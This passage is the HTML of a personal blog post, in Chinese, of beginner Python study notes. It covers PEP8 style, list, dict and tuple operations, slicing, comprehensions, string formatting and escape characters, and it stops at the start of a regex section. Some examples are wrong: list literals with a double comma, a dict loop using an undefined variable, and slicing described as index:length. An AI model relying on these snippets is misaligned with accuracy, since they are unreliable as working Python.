@@ -1,0 +1,1251 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: true,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="1# -*- coding: utf-8 -*- 可以识别中文 123&amp;apos;&amp;apos;&amp;apos;xxxxxxxxx&amp;apos;&amp;apos;&amp;apos; 多行注释">
+<meta property="og:type" content="article">
+<meta property="og:title" content="&#39;Python Notes&#39;">
+<meta property="og:url" content="https://chirec.github.io/2019/05/17/Python-Notes/index.html">
+<meta property="og:site_name" content="Emerald Dream">
+<meta property="og:description" content="1# -*- coding: utf-8 -*- 可以识别中文 123&amp;apos;&amp;apos;&amp;apos;xxxxxxxxx&amp;apos;&amp;apos;&amp;apos; 多行注释">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://chirec.github.io/2019/05/17/Python-Notes/shell.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/17/Python-Notes/backdoor.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/17/Python-Notes/optparse.OptionParser.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/17/Python-Notes/optparse.add_option.png">
+<meta property="og:updated_time" content="2019-05-24T13:56:51.328Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="&#39;Python Notes&#39;">
+<meta name="twitter:description" content="1# -*- coding: utf-8 -*- 可以识别中文 123&amp;apos;&amp;apos;&amp;apos;xxxxxxxxx&amp;apos;&amp;apos;&amp;apos; 多行注释">
+<meta name="twitter:image" content="https://chirec.github.io/2019/05/17/Python-Notes/shell.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="https://chirec.github.io/2019/05/17/Python-Notes/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>'Python Notes' | Emerald Dream</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Emerald Dream</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+  
+  
+
+  
+
+  <a href="https://github.com/yourname" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/05/17/Python-Notes/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="chessur">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Emerald Dream">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">'Python Notes'
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-05-17 10:22:27" itemprop="dateCreated datePublished" datetime="2019-05-17T10:22:27+08:00">2019-05-17</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-05-24 21:56:51" itemprop="dateModified" datetime="2019-05-24T21:56:51+08:00">2019-05-24</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br></pre></td></tr></table></figure>
+<p>可以识别中文</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;&apos;xxx</span><br><span class="line">xxx</span><br><span class="line">xxx&apos;&apos;&apos;</span><br></pre></td></tr></table></figure>
+<p>多行注释</p>
+<a id="more"></a>
+<h1 id="代码规范"><a href="#代码规范" class="headerlink" title="代码规范"></a>代码规范</h1><p><a href="https://www.python.org/dev/peps/pep-0008/" target="_blank" rel="noopener">PEP8</a>(Python Enhancement Proposal)</p>
+<p>函数和类的定义，代码前后都要用两个空行进行分隔。</p>
+<p>在同一个类中，各个方法之间应该用一个空行进行分隔。</p>
+<p>二元运算符的左右两侧应该保留一个空格，而且只要一个空格就好。</p>
+<p>变量、函数和属性应该使用小写字母来拼写，如果有多个单词就使用下划线进行连接。</p>
+<p>类中受保护的实例属性，应该以一个下划线开头。</p>
+<p>类中私有的实例属性，应该以两个下划线开头。</p>
+<p>类和异常的命名，应该每个单词首字母大写。</p>
+<p>模块级别的常量，应该采用全大写字母，如果有多个单词就用下划线进行连接。</p>
+<p>类的实例方法，应该把第一个参数命名为<code>self</code>以表示对象自身。</p>
+<p>类的类方法，应该把第一个参数命名为<code>cls</code>以表示该类自身。</p>
+<p><code>import</code>语句总是放在文件开头的地方。</p>
+<p>引入模块的时候，<code>from math import sqrt</code>比<code>import math</code>更好。</p>
+<p>如果有多个<code>import</code>语句，应该将其分为三部分，从上到下分别是Python标准模块、第三方模块和自定义模块，每个部分内部应该按照模块名称的字母表顺序来排列。</p>
+<p>不要用检查长度的方式来判断字符串、列表等是否为<code>None</code>或者没有元素，应该用<code>if not x</code>这样的写法来检查它。</p>
+<p>采用内联形式的否定词，而不要把否定词放在整个表达式的前面。例如<code>if a is not b</code>就比<code>if not a is b</code>更容易让人理解。</p>
+<p><code>__</code>代替未使用的变量</p>
+<h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><h2 id="list"><a href="#list" class="headerlink" title="list"></a>list</h2><p>顺序，可重复<br>查询速度慢，不占内存</p>
+<h3 id="remove"><a href="#remove" class="headerlink" title="remove()"></a>remove()</h3><p>删除已知的元素，不能删除指定位置的元素</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = [&apos;Andy&apos;,&apos;York&apos;]</span><br><span class="line">name.remove(&apos;Andy&apos;)</span><br></pre></td></tr></table></figure>
+<h3 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h3><p>Python使用列表的第一个元素进行比较</p>
+<h3 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name = [&apos;Andy&apos;]</span><br><span class="line">name * 3</span><br><span class="line">[&apos;Andy&apos;,&apos;Andy&apos;,&apos;Andy&apos;]</span><br></pre></td></tr></table></figure>
+<h3 id="in-amp-not-in"><a href="#in-amp-not-in" class="headerlink" title="in &amp; not in"></a>in &amp; not in</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name = [&apos;Andy&apos;,&apos;York&apos;]</span><br><span class="line">&apos;Andy&apos; in name</span><br><span class="line">True</span><br><span class="line">&apos;York&apos; not in name</span><br><span class="line">False</span><br></pre></td></tr></table></figure>
+<h3 id="index"><a href="#index" class="headerlink" title="index()"></a>index()</h3><p>查询参数在列表的位置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = [&apos;Andy&apos;,&apos;York&apos;]</span><br><span class="line">name.index(&apos;York&apos;)</span><br></pre></td></tr></table></figure>
+<h3 id="count"><a href="#count" class="headerlink" title="count()"></a>count()</h3><p>查询同一元素在列表里出现的次数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name = [&apos;Andy&apos;,&apos;York&apos;]</span><br><span class="line">name.extend([&apos;Andy&apos;,&apos;Windy&apos;])</span><br><span class="line">name.count(&apos;Andy&apos;)</span><br><span class="line">name.count(&apos;Windy&apos;)</span><br></pre></td></tr></table></figure>
+<h3 id="reverse"><a href="#reverse" class="headerlink" title="reverse()"></a>reverse()</h3><p>将列表顺序颠倒</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">number = [1,2,3,4,5,67,,89,98,3,5,346,56,0]</span><br><span class="line">number.reverse()</span><br></pre></td></tr></table></figure>
+<h3 id="reversed"><a href="#reversed" class="headerlink" title="reversed()"></a>reversed()</h3><p>返回逆向迭代的序列值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">list = [1,2,3,4,5,26]</span><br><span class="line">for each in reversed(list):</span><br><span class="line">	print(each,end = &apos;,&apos;)</span><br><span class="line">//26,5,4,3,2,1,</span><br></pre></td></tr></table></figure>
+<h3 id="sort"><a href="#sort" class="headerlink" title="sort()"></a>sort()</h3><p>按顺序排列，改变列表原始值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">number = [1,2,3,4,5,67,,89,98,3,5,346,56,0]</span><br><span class="line">number.sort()</span><br></pre></td></tr></table></figure>
+<h3 id="sorted"><a href="#sorted" class="headerlink" title="sorted()"></a>sorted()</h3><p>按顺序排列，不改变列表原始值</p>
+<h2 id="del"><a href="#del" class="headerlink" title="del"></a>del</h2><p>删除列表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = [&apos;Andy&apos;,&apos;York&apos;]</span><br><span class="line">del name</span><br></pre></td></tr></table></figure>
+<h2 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h2><p>顺序，key-value对，key不可重复<br>查询速度快，占内存</p>
+<p>获取value</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">变量名[key] 变量名.get(key) 变量名.get(key,&apos;找不到key对应的值时使用的value&apos;)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for key in dict:</span><br><span class="line">	print(&apos;s&apos;.format(key))</span><br><span class="line">	print(&apos;s&apos;.format(value))</span><br></pre></td></tr></table></figure>
+<h2 id="set"><a href="#set" class="headerlink" title="set"></a>set</h2><p>无序，不可重复<br>查询速度快，不占内存</p>
+<h3 id="tuple"><a href="#tuple" class="headerlink" title="tuple"></a>tuple</h3><p>不可更改元素</p>
+<h3 id="添加元素"><a href="#添加元素" class="headerlink" title="添加元素"></a>添加元素</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tuple = (1,2,3,4,5)</span><br><span class="line">tuple = tuple[:3] + (26,) + tuple[3:]</span><br></pre></td></tr></table></figure>
+<h3 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tuple = (1,2,3,4,5)</span><br><span class="line">tuple = tuple[:2] + tuple[3:]</span><br></pre></td></tr></table></figure>
+<h2 id="求长度"><a href="#求长度" class="headerlink" title="求长度"></a>求长度</h2><p>len()</p>
+<h2 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h2><p>slice[index:length]<br>第一个索引是0可以省略<code>L[:26]</code><br>只用一个<code>:</code>表示从头到尾<code>L[:]</code><br>第三个参数，表示每个N个取一个<code>L[::2]</code>,每2个元素取一个<br>索引可以为负值，表示倒数第N个<br>字符串也是一种list，可以进行切片操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [1,2,3,4,5]</span><br><span class="line">b = a[:]</span><br><span class="line">c = a</span><br></pre></td></tr></table></figure>
+<p>切片是将值赋给变量</p>
+<h2 id="enumerate"><a href="#enumerate" class="headerlink" title="enumerate()"></a>enumerate()</h2><p>将list加上索引</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[&apos;Adam&apos;, &apos;Lisa&apos;, &apos;Bart&apos;, &apos;Paul&apos;]</span><br><span class="line">//enumerate()</span><br><span class="line">[(0, &apos;Adam&apos;), (1, &apos;Lisa&apos;), (2, &apos;Bart&apos;), (3, &apos;Paul&apos;)]</span><br></pre></td></tr></table></figure>
+<h2 id="zip"><a href="#zip" class="headerlink" title="zip()"></a>zip()</h2><p>将两个list结合</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip([10, 20, 30], [&apos;A&apos;, &apos;B&apos;, &apos;C&apos;])</span><br><span class="line">[(10, &apos;A&apos;), (20, &apos;B&apos;), (30, &apos;C&apos;)]</span><br></pre></td></tr></table></figure>
+<h2 id="迭代dict的value"><a href="#迭代dict的value" class="headerlink" title="迭代dict的value"></a>迭代dict的value</h2><p>values()方法：将dict转换为包含了value的list</p>
+<p>itervalues()方法：在迭代过程中依次从dict中取出value，节省内存</p>
+<h2 id="同时迭代dict的value和key"><a href="#同时迭代dict的value和key" class="headerlink" title="同时迭代dict的value和key"></a>同时迭代dict的value和key</h2><p>items()方法</p>
+<p>iteritems()方法</p>
+<h2 id="列表生成式"><a href="#列表生成式" class="headerlink" title="列表生成式"></a>列表生成式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[x * x for x in range(1,11)]</span><br><span class="line">[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]</span><br></pre></td></tr></table></figure>
+<p>列表生成式的 for 循环后面还可以加上 if 判断</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[x * x for x in range(1, 11) if x % 2 == 0]</span><br><span class="line">[4, 16, 36, 64, 100]</span><br></pre></td></tr></table></figure>
+<h2 id="复杂列表生成式"><a href="#复杂列表生成式" class="headerlink" title="复杂列表生成式"></a>复杂列表生成式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tds = [&apos;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&apos; % (name, score) for name, score in d.iteritems()]</span><br><span class="line">print &apos;&lt;table&gt;&apos;</span><br><span class="line">print &apos;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Score&lt;/th&gt;&lt;tr&gt;&apos;</span><br><span class="line">print &apos;\n&apos;.join(tds)</span><br><span class="line">print &apos;&lt;/table&gt;&apos;</span><br></pre></td></tr></table></figure>
+<h2 id="max"><a href="#max" class="headerlink" title="max()"></a>max()</h2><p>返回集合或参数中的最大值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">list = [1,2,3,26]</span><br><span class="line">name = &apos;Andy&apos;</span><br><span class="line">max(list)</span><br><span class="line">//26</span><br><span class="line">max(name)</span><br><span class="line">//y</span><br></pre></td></tr></table></figure>
+<h2 id="min"><a href="#min" class="headerlink" title="min()"></a>min()</h2><p>返回集合或参数中的最小值</p>
+<h2 id="sum"><a href="#sum" class="headerlink" title="sum()"></a>sum()</h2><p>返回总和</p>
+<h1 id="String"><a href="#String" class="headerlink" title="String"></a>String</h1><h2 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h2><h3 id="string-replace"><a href="#string-replace" class="headerlink" title="string.replace()"></a>string.replace()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string.replace(&apos;被替换&apos;,&apos;待替换&apos;)</span><br></pre></td></tr></table></figure>
+<p>替换多个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string.replace(&apos;被替换&apos;,&apos;待替换&apos;).replace(&apos;被替换&apos;,&apos;待替换&apos;)</span><br></pre></td></tr></table></figure>
+<h2 id="分割"><a href="#分割" class="headerlink" title="分割"></a>分割</h2><h3 id="split"><a href="#split" class="headerlink" title="split()"></a>split()</h3><p>将字符串分割成列表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">split(sep=None, maxsplit=-1)</span><br><span class="line">//sep是分割符，默认为空格</span><br><span class="line">//maxsplit是分割数量，默认为-1，即无限制</span><br></pre></td></tr></table></figure>
+<h2 id="input"><a href="#input" class="headerlink" title="input()"></a>input()</h2><p>python3中没有<code>raw_input()</code><br>将<code>raw_input()</code>和<code>input()</code>整合为<code>input()</code></p>
+<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="print"><a href="#print" class="headerlink" title="print()"></a>print()</h2><h3 id="format"><a href="#format" class="headerlink" title="format()"></a>format()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">A = 1</span><br><span class="line">B = 2</span><br><span class="line"></span><br><span class="line">#位置参数</span><br><span class="line">print(&quot;A+B=&#123;&#125; A-B=&#123;&#125;&quot;.format(A+B,A-B))</span><br><span class="line">print(&quot;A+B=&#123;0&#125; A-B=&#123;1&#125;&quot;.format(A+B,A-B))</span><br><span class="line">#关键词参数</span><br><span class="line">print(&quot;A+B=&#123;a&#125; A-B=&#123;b&#125;&quot;.format(a = A+B,b = A-B))</span><br><span class="line">#位置参数必须在关键词参数前面</span><br><span class="line">#错误用法：SyntaxError: positional argument follows keyword argument</span><br><span class="line">print(&quot;A+B=&#123;a&#125; A-B=&#123;0&#125;&quot;.format(a = A+B,A-B))</span><br><span class="line">#正确用法：</span><br><span class="line">print(&quot;A+B=&#123;0&#125; A-B=&#123;a&#125;&quot;.format(A+B,a = A-B))</span><br></pre></td></tr></table></figure>
+<h3 id="print-f"><a href="#print-f" class="headerlink" title="print(f)"></a>print(f)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(f&apos;计算0-9的平方分别为：&#123;result&#125;&apos;)</span><br></pre></td></tr></table></figure>
+<h3 id="格式化操作符"><a href="#格式化操作符" class="headerlink" title="格式化操作符"></a>格式化操作符</h3><table>
+<thead>
+<tr>
+<th style="text-align:center"><strong>符号</strong></th>
+<th><strong>含义</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">%c</td>
+<td>格式化字符及ASCII</td>
+</tr>
+<tr>
+<td style="text-align:center">%s</td>
+<td>格式化字符串</td>
+</tr>
+<tr>
+<td style="text-align:center">%d</td>
+<td>格式化整数</td>
+</tr>
+<tr>
+<td style="text-align:center">%o</td>
+<td>格式化无符号八进制</td>
+</tr>
+<tr>
+<td style="text-align:center">%x</td>
+<td>格式化无符号十六进制数</td>
+</tr>
+<tr>
+<td style="text-align:center">%X</td>
+<td>格式化无符号十六进制数(大写)</td>
+</tr>
+<tr>
+<td style="text-align:center">%f</td>
+<td>格式化浮点数字，可指定小数点后的精度</td>
+</tr>
+<tr>
+<td style="text-align:center">%e</td>
+<td>用科学计数法格式化浮点数</td>
+</tr>
+<tr>
+<td style="text-align:center">%E</td>
+<td>用科学计数法格式化浮点数(大写)</td>
+</tr>
+<tr>
+<td style="text-align:center">%g</td>
+<td>根据值的大小决定使用%f或%E</td>
+</tr>
+<tr>
+<td style="text-align:center">%G</td>
+<td>根据值的大小决定使用%f或%E(大写)</td>
+</tr>
+</tbody>
+</table>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;%c&apos; % 99</span><br><span class="line">&apos;%c%c%c%c%c%c%c&apos; % (99,104,101,115,115,117,114)</span><br></pre></td></tr></table></figure>
+<h3 id="格式化操作符的辅助命令"><a href="#格式化操作符的辅助命令" class="headerlink" title="格式化操作符的辅助命令"></a>格式化操作符的辅助命令</h3><table>
+<thead>
+<tr>
+<th style="text-align:center">符号</th>
+<th style="text-align:center">含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">m.n</td>
+<td style="text-align:center">m是最小总宽度，n是小数点后的位数</td>
+</tr>
+<tr>
+<td style="text-align:center">-</td>
+<td style="text-align:center">结果左对齐</td>
+</tr>
+<tr>
+<td style="text-align:center">+</td>
+<td style="text-align:center">在证书面前显示加号（+）</td>
+</tr>
+<tr>
+<td style="text-align:center">#</td>
+<td style="text-align:center">在八进制面前显示‘0o’，在十六进制数面前显示‘0x’,’0X’</td>
+</tr>
+<tr>
+<td style="text-align:center">0</td>
+<td style="text-align:center">显示的数字前面填充‘0’代替空格</td>
+</tr>
+</tbody>
+</table>
+<h3 id="Python的转义字符及含义"><a href="#Python的转义字符及含义" class="headerlink" title="Python的转义字符及含义"></a>Python的转义字符及含义</h3><table>
+<thead>
+<tr>
+<th style="text-align:center">符号</th>
+<th style="text-align:center">含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">\’</td>
+<td style="text-align:center">单引号</td>
+</tr>
+<tr>
+<td style="text-align:center">\”</td>
+<td style="text-align:center">双引号</td>
+</tr>
+<tr>
+<td style="text-align:center">\a</td>
+<td style="text-align:center">发出系统响铃</td>
+</tr>
+<tr>
+<td style="text-align:center">\b</td>
+<td style="text-align:center">退格符</td>
+</tr>
+<tr>
+<td style="text-align:center">\n</td>
+<td style="text-align:center">换行符</td>
+</tr>
+<tr>
+<td style="text-align:center">\t</td>
+<td style="text-align:center">横向制表符（TAB）</td>
+</tr>
+<tr>
+<td style="text-align:center">\v</td>
+<td style="text-align:center">纵向制表符</td>
+</tr>
+<tr>
+<td style="text-align:center">\r</td>
+<td style="text-align:center">回车符</td>
+</tr>
+<tr>
+<td style="text-align:center">\f</td>
+<td style="text-align:center">换页符</td>
+</tr>
+<tr>
+<td style="text-align:center">\o</td>
+<td style="text-align:center">八进制数代表字符</td>
+</tr>
+<tr>
+<td style="text-align:center">\x</td>
+<td style="text-align:center">十六进制数代表字符</td>
+</tr>
+<tr>
+<td style="text-align:center">\0</td>
+<td style="text-align:center">代表一个空字符</td>
+</tr>
+<tr>
+<td style="text-align:center">\\</td>
+<td style="text-align:center">反斜杠</td>
+</tr>
+</tbody>
+</table>
+<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="re模块"><a href="#re模块" class="headerlink" title="re模块"></a>re模块</h2><p>regular expression</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br></pre></td></tr></table></figure>
